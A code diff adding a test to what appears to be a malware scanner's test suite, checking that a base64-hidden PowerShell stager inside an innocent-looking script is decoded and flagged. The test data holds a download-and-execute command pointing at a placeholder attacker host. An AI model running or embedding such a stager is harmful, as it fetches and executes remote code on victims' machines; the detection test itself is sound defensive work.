@@ -82,6 +82,18 @@ def test_phishing_email(tmp_path):
     assert _scan(tmp_path, "p.eml", data).verdict >= Verdict.SUSPICIOUS
 
 
+def test_deobfuscation_recovers_hidden_stager(tmp_path):
+    import base64
+    hidden = (b"powershell -w hidden -enc x; IEX (New-Object "
+              b"Net.WebClient).DownloadString('http://evil.example/p.ps1')")
+    b64 = base64.b64encode(hidden).decode()
+    wrapper = f"# harmless looking helper\n$d = '{b64}'\nWrite-Output 'hi'\n"
+    r = _scan(tmp_path, "wrapper.ps1", wrapper.encode())
+    # The hidden base64 stager is recovered, re-scanned, and elevates the verdict.
+    assert r.verdict >= Verdict.SUSPICIOUS
+    assert any(f.analyzer == "deobfuscate" for f in r.findings)
+
+
 def test_masqueraded_executable(tmp_path):
     # A PE wearing a .jpg extension - at least low risk from the mismatch.
     r = _scan(tmp_path, "photo.jpg", b"MZ\x90\x00" + b"\x00" * 200)
